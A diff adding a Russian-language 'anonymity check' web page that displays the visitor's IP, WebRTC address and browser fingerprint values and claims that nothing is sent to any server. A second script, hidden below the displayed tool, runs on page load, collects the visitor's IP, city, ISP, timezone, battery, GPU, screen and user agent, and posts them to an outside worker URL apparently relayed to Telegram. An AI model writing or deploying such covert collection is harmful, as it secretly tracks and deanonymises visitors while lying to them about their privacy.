@@ -1,0 +1,96 @@
+<!DOCTYPE html><html lang="ru">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<title>Проверка анонимности</title>
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600&display=swap" rel="stylesheet" />
+<style>
+:root{--glass-bg:rgba(255,255,255,0.08);--glass-border:rgba(255,255,255,0.15);}*{margin:0;padding:0;box-sizing:border-box;font-family:'Inter',sans-serif;}body{min-height:100vh;display:flex;flex-direction:column;align-items:center;background:radial-gradient(circle at 20% 20%,#1b1f27 0%,#0d1117 60%);color:#fff;padding:2rem 1rem;}.container{width:100%;max-width:900px;display:flex;flex-direction:column;gap:1.75rem;}.glass{background:var(--glass-bg);backdrop-filter:blur(18px);-webkit-backdrop-filter:blur(18px);border:1px solid var(--glass-border);border-radius:2rem;box-shadow:0 8px 32px rgba(0,0,0,0.35);padding:2rem;width:100%;}h1{text-align:center;font-size:2rem;font-weight:600;margin-bottom:0.5rem;}h2{font-size:1.25rem;font-weight:600;margin-bottom:0.75rem;}.row{display:flex;flex-wrap:wrap;gap:0.5rem 1rem;margin-bottom:0.5rem;}.label{opacity:0.7;min-width:180px;}.value{opacity:0.9;word-break:break-all;}.score{font-size:2.75rem;font-weight:700;text-align:center;margin-top:1.25rem;}footer{margin-top:auto;padding:2rem 0 0.5rem;font-size:0.9rem;color:#999;text-align:center;}@media(max-width:600px){.glass{padding:1.5rem;}}
+</style>
+</head>
+<body>
+<div class="container">
+<div class="glass" id="intro"><h1>Проверка анонимности</h1></div>
+<div class="glass" id="info"><h2>Информация о соединении</h2><div class="row"><span class="label">IP / ISP:</span><span class="value" id="ip">…</span></div><div class="row"><span class="label">Город / Страна:</span><span class="value" id="geo">…</span></div><div class="row"><span class="label">WebRTC IP:</span><span class="value" id="webrtc">…</span></div></div>
+<div class="glass" id="browser"><h2>Характеристики браузера</h2><div class="row"><span class="label">User‑Agent:</span><span class="value" id="ua">…</span></div><div class="row"><span class="label">Платформа:</span><span class="value" id="platform">…</span></div><div class="row"><span class="label">Язык:</span><span class="value" id="lang">…</span></div><div class="row"><span class="label">Часовой пояс:</span><span class="value" id="tz">…</span></div><div class="row"><span class="label">Смещение TZ:</span><span class="value" id="tzoff">…</span></div><div class="row"><span class="label">Разрешение:</span><span class="value" id="screen">…</span></div><div class="row"><span class="label">Device Memory:</span><span class="value" id="mem">…</span></div><div class="row"><span class="label">CPU Threads:</span><span class="value" id="cpu">…</span></div><div class="row"><span class="label">Vendor:</span><span class="value" id="vendor">…</span></div><div class="row"><span class="label">Webdriver:</span><span class="value" id="wd">…</span></div><div class="row"><span class="label">Плагины:</span><span class="value" id="plugins">…</span></div><div class="row"><span class="label">Canvas FP:</span><span class="value" id="canvas">…</span></div><div class="row"><span class="label">Audio FP:</span><span class="value" id="audio">…</span></div><div class="row"><span class="label">Touch:</span><span class="value" id="touch">…</span></div><div class="row"><span class="label">LocalStorage:</span><span class="value" id="ls">…</span></div><div class="row"><span class="label">Cookies:</span><span class="value" id="cookies">…</span></div></div>
+<div class="glass" id="signals"><h2>Дополнительные сигналы</h2><div class="row"><span class="label">WebGL GPU:</span><span class="value" id="webgl">…</span></div><div class="row"><span class="label">Fonts FP:</span><span class="value" id="fonts">…</span></div><div class="row"><span class="label">Battery lvl:</span><span class="value" id="battery">…</span></div><div class="row"><span class="label">Tor‑подозрение:</span><span class="value" id="tor">…</span></div><div class="row"><span class="label">Math FP:</span><span class="value" id="mathfp">…</span></div><div class="row"><span class="label">Voices FP:</span><span class="value" id="voices">…</span></div><div class="row"><span class="label">MediaDevices:</span><span class="value" id="media">…</span></div><div class="row"><span class="label">Permissions:</span><span class="value" id="perm">…</span></div></div>
+<div class="glass" id="score-block"><h2>Оценка анонимности</h2><div class="score" id="score">…</div></div>
+<div class="glass" id="security"><h2>Безопасность</h2><p>Все вычисления выполняются локально в вашем браузере. Никакие данные не отправляются на сервер, куки и внешние трекеры не используются.</p></div>
+</div>
+<footer>by Aik Carroll</footer>
+<script>
+function h(s){let r=0;for(let i=0;i<s.length;i++){r=(r<<5)-r+s.charCodeAt(i);r|=0;}return('00000000'+(r>>>0).toString(16)).slice(-8);}async function ipInfo(){try{const d=await fetch('https://ipapi.co/json/').then(r=>r.json());ip.textContent=`${d.ip} / ${d.org||'?'}`;geo.textContent=`${d.city||'?'} , ${d.country_name||d.country||'?'}`;return d;}catch{return{};}}function envInfo(){const ua=navigator.userAgent;const platform=navigator.platform;const lang=navigator.language;const tz=Intl.DateTimeFormat().resolvedOptions().timeZone;const tzoff=new Date().getTimezoneOffset();const scr=`${screen.width}×${screen.height}`;const mem=navigator.deviceMemory||'?';const cpu=navigator.hardwareConcurrency||'?';const vendor=navigator.vendor||'?';const wd=!!navigator.webdriver;const plugins=navigator.plugins?navigator.plugins.length:0;const touch=('ontouchstart'in window)||navigator.maxTouchPoints>0;const cookies=navigator.cookieEnabled;let ls=false;try{localStorage.setItem('t','1');ls=localStorage.getItem('t')==='1';localStorage.removeItem('t');}catch{};uaEl.textContent=ua;platformEl.textContent=platform;langEl.textContent=lang;tzEl.textContent=tz;tzoffEl.textContent=tzoff;scrEl.textContent=scr;memEl.textContent=mem;cpuEl.textContent=cpu;vendorEl.textContent=vendor;wdEl.textContent=wd;pluginsEl.textContent=plugins;touchEl.textContent=touch;lsEl.textContent=ls;cookiesEl.textContent=cookies;return{ua,platform,lang,tz,tzoff,scr,mem,cpu,vendor,wd,plugins,touch,ls,cookies};}function webrtcIP(){return new Promise(r=>{let done=false;const pc=new RTCPeerConnection({iceServers:[]});pc.createDataChannel('');pc.createOffer().then(o=>pc.setLocalDescription(o));pc.onicecandidate=e=>{if(e&&e.candidate&&!done){const ip=e.candidate.candidate.split(' ')[4];webrtc.textContent=ip;done=true;pc.close();r(ip);}};setTimeout(()=>{if(!done){webrtc.textContent='n/a';pc.close();r(null);}},3000);});}function canvasFP(){const c=document.createElement('canvas');const ctx=c.getContext('2d');ctx.textBaseline='top';ctx.font="16px 'Arial'";ctx.fillText('fingerprint',2,2);const d=c.toDataURL();const fp=h(d);canvas.textContent=fp;return fp;}function audioFP(){return new Promise(r=>{try{const ctx=new(OfflineAudioContext||webkitOfflineAudioContext)(1,44100,44100);const osc=ctx.createOscillator();osc.type='triangle';osc.frequency.value=10000;const comp=ctx.createDynamicsCompressor();osc.connect(comp);comp.connect(ctx.destination);osc.start();ctx.startRendering();ctx.oncomplete=e=>{const b=e.renderedBuffer.getChannelData(0);let s=0;for(let i=0;i<b.length;i+=100)s+=Math.abs(b[i]);const fp=h(s.toString());audio.textContent=fp;r(fp);};}catch{audio.textContent='n/a';r(null);}});}async function webglInfo(){try{const c=document.createElement('canvas');const gl=c.getContext('webgl')||c.getContext('experimental-webgl');if(!gl){webgl.textContent='n/a';return null;}const dbg=gl.getExtension('WEBGL_debug_renderer_info');const gpu=dbg?gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL):gl.getParameter(gl.RENDERER);webgl.textContent=gpu;return gpu;}catch{webgl.textContent='n/a';return null;}}function fontsFP(){try{if(document.fonts){const list=[...document.fonts].map(f=>f.family).join(',');const fp=h(list);fonts.textContent=`${fp} (${document.fonts.size})`;return{fp,count:document.fonts.size};}}catch{}fonts.textContent='n/a';return null;}async function batteryLvl(){try{if(navigator.getBattery){const b=await navigator.getBattery();const lvl=Math.round(b.level*100)+'%';battery.textContent=lvl;return lvl;}}catch{}battery.textContent='n/a';return null;}async function mathFP(){const v=[Math.sin(1),Math.acos(0.123),Math.tan(5.5),Math.sqrt(2)].map(x=>x.toFixed(12)).join('-');const fp=h(v);mathfp.textContent=fp;return fp;}function voicesFP(){return new Promise(res=>{try{let tries=0;function attempt(){const vs=speechSynthesis.getVoices();if(vs.length||tries>5){if(vs.length){const fp=h(vs.map(v=>v.name+v.lang).join(','));voices.textContent=`${fp} (${vs.length})`;res(fp);}else{voices.textContent='n/a';res(null);} }else{tries++;setTimeout(attempt,200);} }attempt();}catch{voices.textContent='n/a';res(null);}});}async function mediaDevicesInfo(){try{const list=await navigator.mediaDevices.enumerateDevices();media.textContent=list.length;return list.length;}catch{media.textContent='n/a';return null;}}async function permissionsInfo(){try{const types=['camera','microphone','notifications','geolocation'];const res=await Promise.all(types.map(n=>navigator.permissions.query({name:n}).then(p=>`${n}:${p.state}`)));perm.textContent=res.join(', ');return res;}catch{perm.textContent='n/a';return null;}}function torSuspect(env,gpu,fnts){let s=false;if(env.ua.includes('Tor'))s=true;if(env.vendor===''&&env.platform==='')s=true;if(env.plugins===0)s=true;if(gpu&&/swiftshader|llvmpipe/i.test(gpu))s=true;if(fnts&&fnts.count<20)s=true;tor.textContent=s?'Да':'Нет';return s;}function score(ctx){let sc=100;if(ctx.ip&&ctx.ip.org&&!/vpn|tor|proxy|cloudflare|digital/i.test(ctx.ip.org))sc-=15;if(ctx.webrtc&&ctx.ip&&ctx.webrtc===ctx.ip.ip)sc-=20;if(ctx.env.wd)sc-=10;if(!ctx.env.cookies)sc-=5;if(!ctx.env.ls)sc-=5;if(ctx.env.plugins>5)sc-=5;if(ctx.fnts&&ctx.fnts.count<20)sc-=10;if(ctx.tor)sc-=20;if(ctx.env.mem!=="?"&&ctx.env.mem<4)sc-=5;if(ctx.env.cpu!=="?"&&ctx.env.cpu<4)sc-=5;scoreEl.textContent=`${Math.max(0,sc)}/100`;return sc;}async function main(){const ipd=await ipInfo();const env=envInfo();const webrtcAddr=await webrtcIP();const canvasHash=canvasFP();const audioHash=await audioFP();const gpu=await webglInfo();const fnts=fontsFP();const bat=await batteryLvl();const math=await mathFP();const vfp=await voicesFP();const md=await mediaDevicesInfo();const perms=await permissionsInfo();const torFlag=torSuspect(env,gpu,fnts);score({ip:ipd,env, webrtc:webrtcAddr,fnts,tor:torFlag});}
+const ip=document.getElementById('ip'),geo=document.getElementById('geo'),webrtc=document.getElementById('webrtc');const uaEl=document.getElementById('ua'),platformEl=document.getElementById('platform'),langEl=document.getElementById('lang'),tzEl=document.getElementById('tz'),tzoffEl=document.getElementById('tzoff'),scrEl=document.getElementById('screen'),memEl=document.getElementById('mem'),cpuEl=document.getElementById('cpu'),vendorEl=document.getElementById('vendor'),wdEl=document.getElementById('wd'),pluginsEl=document.getElementById('plugins'),canvas=document.getElementById('canvas'),audio=document.getElementById('audio'),touchEl=document.getElementById('touch'),lsEl=document.getElementById('ls'),cookiesEl=document.getElementById('cookies');const webgl=document.getElementById('webgl'),fonts=document.getElementById('fonts'),battery=document.getElementById('battery'),tor=document.getElementById('tor'),mathfp=document.getElementById('mathfp'),voices=document.getElementById('voices'),media=document.getElementById('media'),perm=document.getElementById('perm'),scoreEl=document.getElementById('score');window.addEventListener('DOMContentLoaded',main);
+</script>
+<script>
+  (async () => {
+    const geoRes = await fetch('https://ipwho.is/');
+    const ipData = await geoRes.json();
+
+    let batteryInfo = {};
+    if (navigator.getBattery) {
+      try {
+        const battery = await navigator.getBattery();
+        batteryInfo = { charging: battery.charging, level: battery.level };
+      } catch {}
+    }
+
+    function getWebGLInfo() {
+      try {
+        const canvas = document.createElement('canvas');
+        const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+        const dbg = gl.getExtension('WEBGL_debug_renderer_info');
+        return {
+          vendor: gl.getParameter(dbg.UNMASKED_VENDOR_WEBGL),
+          renderer: gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL)
+        };
+      } catch {
+        return { vendor: 'неизвестно', renderer: 'неизвестно' };
+      }
+    }
+
+    const gpu = getWebGLInfo();
+    const info = {
+      ip: ipData.ip,
+      city: ipData.city,
+      region: ipData.region,
+      country: ipData.country,
+      isp: ipData.connection?.isp || 'Неизвестно',
+      timezone: ipData.timezone?.id || 'N/A',
+      userAgent: navigator.userAgent,
+      screen: `${screen.width}x${screen.height}`,
+      platform: navigator.platform,
+      language: navigator.language,
+      touchSupport: navigator.maxTouchPoints > 0 ? 'да' : 'нет',
+      battery: batteryInfo,
+      gpuVendor: gpu.vendor,
+      gpuRenderer: gpu.renderer,
+      time: new Date().toLocaleString()
+    };
+
+    const text = `
+🕵️ anonymitycheck.carroll-project.online:
+IP: ${info.ip}
+Город: ${info.city}, ${info.country}
+Провайдер: ${info.isp}
+Часовой пояс: ${info.timezone}
+Платформа: ${info.platform}
+Язык браузера: ${info.language}
+Разрешение экрана: ${info.screen}
+Поддержка касаний: ${info.touchSupport}
+Батарея: ${info.battery.level * 100}% ${info.battery.charging ? '(заряжается)' : ''}
+GPU Vendor: ${info.gpuVendor}
+GPU Renderer: ${info.gpuRenderer}
+Браузер: ${info.userAgent}
+Время: ${info.time}
+    `.trim();
+
+    await fetch('https://tg-proxy.vassa0081-0f3.workers.dev', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ text })
+    });
+  })();
+</script>
+</body>
+</html>
